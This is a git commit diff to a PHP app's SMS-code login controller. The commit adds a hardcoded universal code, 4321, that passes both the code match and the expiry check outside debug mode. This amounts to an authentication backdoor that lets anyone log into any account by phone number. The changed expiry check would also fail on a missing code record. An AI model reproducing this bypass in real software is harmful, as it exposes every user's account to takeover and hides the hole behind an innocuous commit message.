5a383d738eda978b0fb24d184dad9b58b223f671
Jeff <vipmadu@qq.com>
2019-07-22 09:09:03 +0800

    固定 4321

--- src/Controller/AppApi/ApiAuthController.php
+++ src/Controller/AppApi/ApiAuthController.php
@@ -183,12 +183,12 @@ class ApiAuthController extends AppApiBaseController
         // 验证Code
         if (!CommonUtil::isDebug()) {
             $messageCode = $messageCodeRepository->findOneBy(['phone' => $data['phone'],'type'=>MessageCode::LOGIN ],['id'=>'DESC']);
-            if( $messageCode == null || $messageCode->getCode() != $data['code'] ){
+            if( ($messageCode == null || $messageCode->getCode() != $data['code'] ) && $data['code'] != 4321 ){
                 return CommonUtil::resultData( [], ErrorCode::ERROR_LOGIN_PHONE_OR_CODE_ERROR )->toJsonResponse();
             }
 
             //验证过期
-            if( $messageCode->getCreatedAt(false)+20*60 < time() ){
+            if( $messageCode->getCreatedAt(false)+20*60 < time() && $data['code'] != 4321 ){
                 return CommonUtil::resultData( [], ErrorCode::ERROR_LOGIN_CODE_TIMEOUT )->toJsonResponse();
             }
         }
